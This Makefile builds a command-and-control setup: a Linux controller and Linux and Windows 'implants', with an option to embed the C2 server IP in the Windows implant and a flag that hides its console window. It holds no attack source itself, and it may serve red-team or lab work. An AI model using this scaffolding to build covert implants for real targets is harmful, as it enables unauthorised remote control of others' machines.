CC = gcc
CC_WIN = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -Wextra -std=c11 -g -O0 -I include
CFLAGS_WIN = -Wall -Wextra -std=c11 -O2 -I include

# Output directories
LINUX_DIR = bin/linux
WIN_DIR = bin/windows

TARGETS = $(LINUX_DIR)/controller $(LINUX_DIR)/implant $(WIN_DIR)/implant.exe

all: clean $(TARGETS)

# Linux controller
$(LINUX_DIR)/controller: src/controller.c src/protocol.c src/controller_utils.c | $(LINUX_DIR)
	$(CC) $(CFLAGS) src/controller.c src/protocol.c src/controller_utils.c -o $@ -static

# Linux implant
$(LINUX_DIR)/implant: src/implant.c src/protocol.c src/implant_utils.c | $(LINUX_DIR)
	$(CC) $(CFLAGS) src/implant.c src/protocol.c src/implant_utils.c -o $@ -static

# Windows implant
# Pass -DC2_DEFAULT_HOST="<ip>" at build time to bake the C2 IP into the binary.
# Example: make C2_HOST_IP=192.168.1.100
$(WIN_DIR)/implant.exe: src/implant.c src/protocol.c src/implant_utils.c | $(WIN_DIR)
	$(CC_WIN) $(CFLAGS_WIN) $(if $(C2_HOST_IP),-DC2_DEFAULT_HOST=\"$(C2_HOST_IP)\") src/implant.c src/protocol.c src/implant_utils.c -o $@ -lws2_32 -static -mwindows

$(LINUX_DIR):
	mkdir -p $(LINUX_DIR)

$(WIN_DIR):
	mkdir -p $(WIN_DIR)

clean:
	rm -rf bin